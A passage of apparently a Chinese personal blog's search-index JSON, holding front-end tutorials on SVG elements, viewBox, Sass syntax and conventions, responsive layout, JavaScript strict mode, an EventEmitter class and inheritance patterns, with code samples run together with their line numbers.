&lt;rect x=&quot;20&quot; y=&quot;40&quot; width=&quot;200&quot; height=&quot;200&quot; rx=&quot;20&quot; ry=&quot;30&quot; style=&quot;fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2&quot;/&gt; &lt;circle cx=&quot;290&quot; cy=&quot;60&quot; r=&quot;40&quot; style=&quot;fill: #0f0; fill-opacity: .4;&quot;/&gt; &lt;ellipse cx=&quot;300&quot; cy=&quot;150&quot; rx=&quot;60&quot; ry=&quot;40&quot; style=&quot;fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;&quot;/&gt; &lt;line x1=&quot;240&quot; y1=&quot;220&quot; x2=&quot;395&quot; y2=&quot;220&quot; style=&quot;stroke: #333; stroke-width: 2;&quot;/&gt; &lt;polyline points=&quot;3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210&quot; style=&quot;fill:none; stroke:#099; stroke-width: 1&quot;/&gt; &lt;polygon points=&quot;110, 20 30, 40 80, 50&quot; style=&quot;fill: #934;&quot;/&gt; &lt;polygon points=&quot;100,10 40,198 190,78 10,78 160,198&quot; style=&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot; /&gt; &lt;path d=&quot;M 175 200 l 150 0&quot; stroke=&quot;green&quot; stroke-width=&quot;3&quot; fill=&quot;none&quot; /&gt; &lt;path d=&quot;M 100 350 q 150 -300 300 0&quot; stroke=&quot;blue&quot; stroke-width=&quot;5&quot; fill=&quot;none&quot; /&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 结构元素分组 （&lt;g&gt;）说明：&lt;g&gt; 用于分组，它能把多个元素放在一组里，对 &lt;g&gt; 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 &lt;g&gt; 标记上的所有属性。用 &lt;g&gt; 定义的分组还可以使用 &lt;use&gt; 进行复制使用。 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;g style=&quot;fill: red; stroke: #090; stroke-width: 2;&quot;&gt; &lt;circle r=&quot;40&quot; cx=&quot;180&quot; cy=&quot;140&quot;&gt;&lt;/circle&gt; &lt;rect x=&quot;30&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;rect x=&quot;230&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;/g&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 复制 （&lt;use&gt;）说明：&lt;use&gt; 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 &lt;use&gt; 样式 12345678910111213141516171819202122232425262728&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;defs&gt; &lt;g id=&quot;shape&quot; style=&quot;fill: inherit; stroke: #090; stroke-width: 2;&quot;&gt; &lt;circle r=&quot;40&quot; cx=&quot;180&quot; cy=&quot;140&quot;&gt;&lt;/circle&gt; &lt;rect x=&quot;30&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;rect x=&quot;230&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;/g&gt; &lt;/defs&gt; &lt;text y=&quot;15&quot;&gt;图形1&lt;/text&gt; &lt;use x=&quot;20&quot; y=&quot;20&quot; xlink:href=&quot;#shape&quot; style=&quot;fill: #009;&quot;&gt;&lt;/use&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 模板（）&lt;symbol&gt; 的作用是定义一个图像模板，使用 &lt;use&gt; 标记实例化它，然后在 SVG 文档中反复使用。&lt;symbol&gt; 本身不会输出任何图像，只有使用 &lt;use&gt; 实例化后才会显示。 12345678910111213141516171819202122232425262728&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;!-- symbol definition NEVER draw --&gt; &lt;symbol id=&quot;sym01&quot; viewBox=&quot;0 0 150 110&quot;&gt; &lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke-width=&quot;8&quot; stroke=&quot;red&quot; fill=&quot;red&quot; /&gt; &lt;circle cx=&quot;90&quot; cy=&quot;60&quot; r=&quot;40&quot; stroke-width=&quot;8&quot; stroke=&quot;green&quot; fill=&quot;white&quot; /&gt; &lt;/symbol&gt; &lt;!-- actual drawing by &quot;use&quot; element --&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;50&quot; /&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;50&quot; width=&quot;75&quot; height=&quot;38&quot; /&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;100&quot; width=&quot;50&quot; height=&quot;25&quot; /&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"}],"tags":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"}]},{"title":"viewBox 与 preserveAspectRatio","slug":"SVG/viewBox 与 preserveAspectRatio","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:34:28.817Z","comments":true,"path":"2021/03/24/SVG/viewBox 与 preserveAspectRatio/","link":"","permalink":"https://xuxb.github.io/2021/03/24/SVG/viewBox%20%E4%B8%8E%20preserveAspectRatio/","excerpt":"","text":"viewBox 与 preserveAspectRatio视窗（viewport）视窗是指一块 SVG 可见的区域 如 &lt;svg width=&quot;500&quot; height=&quot;300&quot;&gt;&lt;/svg&gt; 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 em、rem 等） 当 width 、 height 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理 视图盒子（viewBox）viewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。 这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。 实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。 123&lt;svg width=&quot;400&quot; height=&quot;300&quot; viewBox=&quot;0,0,40,30&quot; style=&quot;border:1px solid #cd0000;&quot;&gt; &lt;rect x=&quot;10&quot; y=&quot;5&quot; width=&quot;20&quot; height=&quot;15&quot; fill=&quot;#cd0000&quot;/&gt;&lt;/svg&gt; preserveAspectRatiopreserveAspectRatio=&quot;xMidYMid meet&quot; xMidYMid：表示 viewBox 如何与 viewport 对齐 meet：表示如何维持高宽比 值 含义 xMin viewport 和 viewBox 左边对齐 xMid viewport 和 viewBox x 轴中心对齐 xMax viewport 和 viewBox 右边对齐 YMin viewport 和 viewBox 上边缘对齐 YMid viewport 和 viewBox y 轴中心点对齐 YMax viewport 和 viewBox 下边缘对齐 值 含义 meet 保持纵横比缩放 viewBox 适应 viewport slice 保持纵横比同时比例小的方向放大填满 viewport none 扭曲纵横比以充分适应 viewport","categories":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"}],"tags":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"}]},{"title":"Sass 基础语法","slug":"Sass/Sass 基础语法","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:28:59.023Z","comments":true,"path":"2021/03/24/Sass/Sass 基础语法/","link":"","permalink":"https://xuxb.github.io/2021/03/24/Sass/Sass%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","excerpt":"","text":"1、 FIS3 中集成 Sass1.1 插件安装 sass 编译 npm i fis3-parser-node-sass -g 前缀添加 npm i fis3-preprocessor-cssprefixer -g 必须全局安装 1234567891011121314fis.match(&#x27;*.scss&#x27;, &#123; parser: fis.plugin(&#x27;node-sass&#x27;), rExt: &#x27;css&#x27;, release: &#x27;$0&#x27;&#125;);fis.match(&#x27;_*.scss&#x27;, &#123; release: false&#125;);fis.match(&#x27;*.scss&#x27;, &#123; preprocessor: fis.plugin(&#x27;cssprefixer&#x27;, &#123; &quot;browsers&quot;: [&quot;Android &gt;= 2.1&quot;, &quot;iOS &gt;= 4&quot;, &quot;ie &gt;= 8&quot;, &quot;firefox &gt;= 15&quot;], &quot;cascade&quot;: true &#125;)&#125;); 1.2 目录规范 base _reset.scss _typography.scss helpers _function.scss _mixin.scss _variable.scss components _header.scss _footer.scss _buttons.scss _cards.scss layouts _responsive.scss pages _page1.scss _page2.scss lib bootstrap.scss font-awesome.scss main.scss 1.3 编码规范1.3.1 Sass 性能优化 用 class 分类代替子代选择器 建议用子选择器，而不是后代选择器，提高性能 特殊类别选择属性选择器 1.3.2 Sass 属性声明顺序 z-index, display position, left, top, right, bottom overflow, float, clear margin, padding background, border font, text scss 代码块应有的顺序 1.3.2 Sass 使用规则 当前选择器的样式属性 父级选择器的伪类选择器 (:first-letter, :hover, :active) 伪类元素 (:before、:after) 父级选择器的声明样式 (.selected, .active, .enlarged) 用 Sass 的上下文媒体查询 子选择器作为最后的部分 2、 Sass 语法说明2.1 后缀名 Sass文件后缀名可为 .scss、 .sass 推荐使用 .scss，与 css 语法完全兼容 不推荐使用 .sass 要求更严格，不能使用 &#123;&#125; 和 ; 2.2 文件导入 可在 Sass 文件中导入 Sass 文件或 css 文件 （对于 Sass 文件可不写后缀名） 基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线） 示例： @import &quot;page/page1&quot; @import &quot;lib/bootstrap.css&quot; 2.3 变量 使用 $ 声明并使用变量 变量可被覆盖（就近原则或在变量后面添加 !default） 变量可为全局或局部 （在选择器外部声明、选择器内部声明） 当变量为字符串时，可在类名、属性名中引用，如 border-#&#123;$variableName&#125; 变量为 list 结构 （在 $size: 18px 30px 34px 使用 nth($size, 1) 调用） 变量为 map 结构（使用 @each $key, $value in $map 调用） 123456789101112131415161718192021$gray: #666 !default;$directory: top;$size: 18px 30px 34px;$heading: (h1: #0aa, h2: #cc0, h3: #b0b);body &#123; color: #f00; a &#123; font-size: nth($size, 1); color: $gray; border-#&#123;$directory&#125;: 1 px solid $gray; &amp;:hover &#123; $font-size: 40 px; font-size: $font-size; &#125; &#125; @each $head, $color in $heading &#123; #&#123;$head&#125; &#123; color: $color; &#125; &#125;&#125; 2.4 嵌套 可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用） @at-root 可跳出所有的上级选择器 （可同时对过个选择器操作） #&#123;&amp;&#125;__modifer 可实现 BEM 特性 123456789101112131415161718// 编译前的 scss 文件.footer &#123; font-size: 16px; @at-root #&#123;&amp;&#125;__modifer &#123; color: #333 &#125; @at-root .nav &amp; &#123; color: #f0f; &#125; @at-root &#123; .child1 &#123; color: #f00; &#125; .child2 &#123; color: #ff0; &#125; &#125;&#125; 1234567891011121314151617181920// 编译后的 css 文件.footer &#123; font-size: 16px;&#125;.footer__modifer &#123; color: #333;&#125;.nav .footer &#123; color: #f0f;&#125;.child1 &#123; color: #f00;&#125;.child2 &#123; color: #ff0;&#125; 2.4 占位选择器 使用 % 声明占位选择器， 通过 @extend 调用占位选择器 当占位选择器没被调用时，不会被解析出来 （推荐使用） 占位选择器可以用其定义一些基础的样式文件 123456789// 编译前的 scss 文件% my-sty &#123; color: #aaa; font-size: 10px;&#125;.child-1 &#123; @extend %my-sty;&#125; 12345// 编译后的 css 文件.child1 &#123; color: #aaa; font-size: 10px;&#125; 2.5 继承说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 .seriousError ）表明它属于另一个类（如 .error），此时适合用继承 使用 %extend 进行继承 可以继承任何定义给单个元素的选择器，比如 .special.cool、a:hover 1234567// 编译前a:hover &#123; text-decoration: underline;&#125;.hoverlink &#123; @extend a: hover;&#125; 1234// 编译后a:hover, .hoverlink &#123; text-decoration: underline;&#125; 123456789// 编译前.error &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 123456789// 编译后.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; border-width: 3px;&#125; 123456789101112// 编译前.error &#123; border: 1px #f00; background-color: #fdd;&#125;.error.intrusion &#123; background-image: url(&quot;/image/hacked.png&quot;);&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 1234567891011// 编译后.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;.error.intrusion, .intrusion.seriousError &#123; background-image: url(&quot;/image/hacked.png&quot;);&#125;.seriousError &#123; border-width: 3px;&#125; 2.6 混合说明：混合指令用于定义可重复的样式，避免使用无语义的 class，如 .clearfix、.float-left 使用 @mixin 声明混合指令，通过 @include 调用混合指令 当混合没被调用时，不会被解析出来 （推荐使用） 混合样式中也可以嵌套其他混合样式 当混合为无参时，推荐使用占位选择器来实现 1234567891011121314151617// 编译前的 scss 文件@mixin ellipsis ($width: 100px) &#123; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: $width;&#125;.text-ellipsis &#123; color: #0ff; @include ellipsis;&#125;.text2-ellipsis &#123; color: #999; @include ellipsis($width: 300px);&#125; 12345678910111213141516// 编译后的 css 文件.text-ellipsis &#123; color: #0ff; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: 100px;&#125;.text2-ellipsis &#123; color: #999; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: 300px;&#125; 1234567891011121314151617// 编译前@mixin height-light &#123; background: #fc0;&#125;@mixin head-text &#123; font-size: 24px;&#125;@mixin computed &#123; @include height-light; @include head-text;&#125;span &#123; @include computed&#125; 12345// 编译后span &#123; background: #fc0; font-size: 24px;&#125; 2.7 函数 使用 @fuction funName (param) &#123;&#125; 声明，通过 funName() 调用 可使用 sass 自带的函数，如 lighten()、darken() 等 1234567891011121314151617// 编译前的 scss 文件@function addSize ($size) &#123; $baseSize: 12px; @return $baseSize+$size;&#125;.link-1 &#123; $blue: #00A3CF; font-size: addSize(10px); color: darken($blue, 25%);&#125;.link-2 &#123; $blue: #00A3CF; font-size: addSize(10px); color: lighten($blue, 20%);&#125; 12345678910// 编译后的 css 文件.link-1 &#123; font-size: 22px; color: #003f50;&#125;.link-2 &#123; font-size: 22px; color: #36d4ff;&#125; 2.8 其他 运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格） 三目运算 条件为真/假时，返回不同的值 （与函数有点类似） @if 条件成立后执行 &#123;&#125; 内的语句 @each 遍历 list 变量、map 变量 @for 在指定数值范围内遍历 1234567891011121314151617181920212223242526// sass 运算、 @if、三目运算 示例// 编译前的 scss 文件$hasSubMenu: true;$level: 2;.wrapper &#123; color: if($hasSubMenu, #f00, #00f); @if $hasSubMenu &#123; background-image: url(&#x27;/images/down-icon.jpg&#x27;); &#125; @if $level==2 &#123; height: 60px * 2; background: #f0f; &#125; @else if $level==3 &#123; height: 60px * 3; background: #f00; &#125;&#125;// 编译后的 css 文件.wrapper &#123; background-image: url(&quot;/images/down-icon.jpg&quot;); height: 120px; color: #f00; background: #f0f;&#125; 123456789101112131415161718192021// @each 示例// 编译前的 scss 文件$animal-list: puma, sea-slug, egret;@each $animal in $animal-list &#123; .#&#123;$animal&#125;-icon &#123; background-image: url(&#x27;/images/#&#123;$animal&#125;.png&#x27;); &#125;&#125;// 编译后的 css 文件.puma-icon &#123; background-image: url(&quot;/images/puma.png&quot;);&#125;.sea-slug-icon &#123; background-image: url(&quot;/images/sea-slug.png&quot;);&#125;.egret-icon &#123; background-image: url(&quot;/images/egret.png&quot;);&#125; 12345678910111213141516171819202122// @for 示例// 编译前的 scss 文件@for $i from 1 to 4 &#123; .content-#&#123;$i&#125; &#123; font-size: &#123; font-size: 14px + $i * 2px; &#125; &#125;&#125;// 编译后的 css 文件.content-1 &#123; font-size: 16px;&#125;.content-2 &#123; font-size: 18px;&#125;.content-3 &#123; font-size: 20px;&#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"}]},{"title":"Sass 技巧篇","slug":"Sass/Sass 技巧篇","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:29:04.442Z","comments":true,"path":"2021/03/24/Sass/Sass 技巧篇/","link":"","permalink":"https://xuxb.github.io/2021/03/24/Sass/Sass%20%E6%8A%80%E5%B7%A7%E7%AF%87/","excerpt":"","text":"数据类型 数字，1, 2, 13, 10px 字符串，有引号字符串与无引号字符串，”foo”, ‘bar’, baz 颜色，blue, #04a3f9, rgba(255,0,0,0.5) 布尔型，true, false 空值，null 数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"}]},{"title":"响应式设计","slug":"CSS/响应式设计","date":"2021-03-21T16:00:00.000Z","updated":"2021-04-28T02:23:55.570Z","comments":true,"path":"2021/03/22/CSS/响应式设计/","link":"","permalink":"https://xuxb.github.io/2021/03/22/CSS/%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"响应式设计一、常见布局 固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度； 响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同； 弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息； 混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似； 二. 响应式布局原理本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种 压缩 —- 拉伸； 平铺 —- 换行； 添加 —- 删除； 三. 实现响应式布局的方法 CSS media query 流体布局 （百分比宽度） 弹性布局 （display：flex） javascript 操作 DOM","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"}]},{"title":"严格模式","slug":"JavaScript/严格模式","date":"2021-03-17T12:24:48.000Z","updated":"2021-04-30T06:40:59.690Z","comments":true,"path":"2021/03/17/JavaScript/严格模式/","link":"","permalink":"https://xuxb.github.io/2021/03/17/JavaScript/%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"严格模式严格模式对正常的 JavaScript语义做了一些更改。 严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。 严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。 严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。 1、严格模式下无法再意外创建全局变量123name = 23; // 23&quot;use strict&quot;;name = 23; // Uncaught ReferenceError: name is not defined 2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常 123NaN = 1; // 23&quot;use strict&quot;;NaN = 1; // Uncaught TypeError: Cannot assign to read only property &#x27;NaN&#x27; of object &#x27;#&lt;Window&gt;&#x27; 3、试图删除不可删除的属性时会抛出异常123delete Object.prototype; // false &quot;use strict&quot;;delete Object.prototype; // Uncaught TypeError: Cannot delete property &#x27;prototype&#x27; of function Object() &#123; [native code] &#125; 4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）6、严格模式下的 eval 不再为上层范围引入新变量7、严格模式禁止删除声明的变量8、严格模式禁止使用 arguments.callee9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化12345678function f(a)&#123; &quot;use strict&quot;; a = 42; return [a, arguments[0]];&#125;var pair = f(17);console.assert(pair[0] === 42);console.assert(pair[1] === 17); // arguments[0] 为传入的值且不再改变","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"EventEmitter 实现原理","slug":"JavaScript 编程题/EventEmitter 实现原理","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:16.820Z","comments":true,"path":"2021/03/12/JavaScript 编程题/EventEmitter 实现原理/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/EventEmitter%20%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"","text":"EventEmitter 实现原理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class EventEmitter &#123; constructor() &#123; this.events = Object.create(null) &#125; // 监听事件 on(eventName, fn) &#123; if (!this.events[eventName]) &#123; this.events[eventName] = [] &#125; this.events[eventName].push(fn) &#125; // 触发事件 emit(eventName, ...args) &#123; if (!this.events[eventName] || !Array.isArray(this.events[eventName])) return this.events[eventName].map(fn =&gt; &#123; fn.apply(this, args) &#125;) &#125; // 注销事件 off(eventName, fn) &#123; if (fn === void 0) &#123; this.events[eventName] = null return &#125; if (this.events[eventName].length) &#123; const index = this.events[eventName].findIndex(item =&gt; item === fn) if (index &gt; -1) &#123; this.events[eventName].splice(index, 1) &#125; &#125; &#125; // 注册单次执行的事件 once(eventName, fn) &#123; const only = (...args) =&gt; &#123; fn.apply(this, args) this.off(eventName) &#125; this.on(eventName, only) &#125;&#125;// test on/emit functionconst eventBus = new EventEmitter()eventBus.on(&#x27;click&#x27;, () =&gt; console.log(1))eventBus.emit(&#x27;click&#x27;)// --- output ---// 1// test on/emit functionconst cb = function (...args) &#123; console.log(&#x27;2: &#x27;, args)&#125;eventBus.on(&#x27;input&#x27;, () =&gt; console.log(1))eventBus.on(&#x27;input&#x27;, cb)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// 1 ​​​​​// 2: [ &#123; name: &#x27;jack&#x27; &#125;, &#123; age: 18 &#125; ] // test on/off/emit functioneventBus.off(&#x27;input&#x27;, cb)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// 1 ​​​​​// test on/off/emit functioneventBus.off(&#x27;input&#x27;)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// test once/emit functioneventBus.once(&#x27;change&#x27;, cb)eventBus.emit(&#x27;change&#x27;, &#123;name: &#x27;jack&#x27;&#125;)eventBus.emit(&#x27;change&#x27;, &#123;name: &#x27;jack&#x27;&#125;)// --- output ---// [ &#123; name: &#x27;jack&#x27; &#125; ]","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 实现继承的几种方式","slug":"JavaScript 编程题/JS 实现继承的几种方式","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:25.245Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 实现继承的几种方式/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"JS 实现继承的几种方式[TOC] 1. 原型链继承123456789101112131415161718192021function SuperType() &#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function () &#123; return this.property;&#125;;function SubType() &#123; this.subproperty = false;&#125;//继承了 SuperTypeSubType.prototype = new SuperType();SubType.prototype.constructor = SubType;SubType.prototype.getSubValue = function () &#123; return this.subproperty;&#125;;var instance = new SubType();console.log(instance.getSubValue()); // falseconsole.log(instance.getSuperValue()); // true 缺点： 包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响 在创建子类型的实例时，不能向超类型的构造函数中传递参数 2. 借用构造函数继承1234567891011121314function SuperType()&#123; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];&#125;function SubType()&#123; //继承了 SuperType SuperType.call(this);&#125;var instance1 = new SubType();instance1.colors.push(&quot;black&quot;);console.log(instance1.colors); //&quot;red,blue,green,black&quot;var instance2 = new SubType();console.log(instance2.colors); //&quot;red,blue,green&quot; 缺点： 无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用） 在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式 3. 原型链 + 借用构造函数继承1234567891011121314151617181920212223242526272829function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;]; &#125; SuperType.prototype.sayName = function()&#123; console.log(this.name); &#125;; function SubType(name, age)&#123; //继承属性 SuperType.call(this, name); this.age = age; &#125; //继承方法 SubType.prototype = new SuperType(); SubType.prototype.constructor = SubType; SubType.prototype.sayAge = function()&#123; console.log(this.age); &#125;; var instance1 = new SubType(&quot;Nicholas&quot;, 29); instance1.colors.push(&quot;black&quot;); console.log(instance1.colors); //&quot;red,blue,green,black&quot; instance1.sayName(); //&quot;Nicholas&quot;; instance1.sayAge(); //29 var instance2 = new SubType(&quot;Greg&quot;, 27); console.log(instance2.colors); //&quot;red,blue,green&quot; instance2.sayName(); //&quot;Greg 说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式 缺点： 会调用两次超类型构造函数 4. 混入式继承123456789101112131415function MyClass() &#123; SuperClass.call(this); OtherSuperClass.call(this);&#125;// 继承一个类MyClass.prototype = Object.create(SuperClass.prototype);// 混合其它Object.assign(MyClass.prototype, OtherSuperClass.prototype);// 重新指定constructorMyClass.prototype.constructor = MyClass;MyClass.prototype.myMethod = function() &#123; // do something&#125;; 5. 原型式继承原型式继承适用于一个对象继承自另一个对象的情况，可以不必引入构造函数 ECMAScript5 通过新增 Object.create()方法规范化了原型式继承。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象 1234567891011121314151617181920var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;, &quot;Court&quot;, &quot;Van&quot;]&#125;;var anotherPerson = Object.create(person);anotherPerson.name = &quot;Greg&quot;;anotherPerson.friends.push(&quot;Rob&quot;);var yetAnotherPerson = Object.create(person);yetAnotherPerson.name = &quot;Linda&quot;;yetAnotherPerson.friends.push(&quot;Barbie&quot;);alert(person.friends); // &quot;Shelby,Court,Van,Rob,Barbie&quot; // 模拟 Object.create() 方法Object.$create = function(original) &#123; var fn = function() &#123;&#125;; fn.prototype = original; return new fn();&#125; 在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样 6. 寄生式继承寄生式继承是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。 1234567891011121314function createAnother(original) &#123; var clone = Object.create(original); // 通过调用函数创建一个新对象 clone.sayHi = function () &#123; //以某种方式来增强这个对象 console.log(&quot;hi&quot;); &#125;; return clone; //返回这个对象&#125;var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;, &quot;Court&quot;, &quot;Van&quot;],&#125;;var anotherPerson = createAnother(person);anotherPerson.sayHi(); //&quot;hi&quot; 缺点： 需要在构造函数中给每个对象添加函数，导致不能复用函数 7. 寄生 + 原型链继承寄生 + 原型链是引用类型最理想的继承范式 123456789101112131415161718192021222324function inheritPrototype(subType, superType) &#123; var prototype = Object.create(superType.prototype); //创建对象 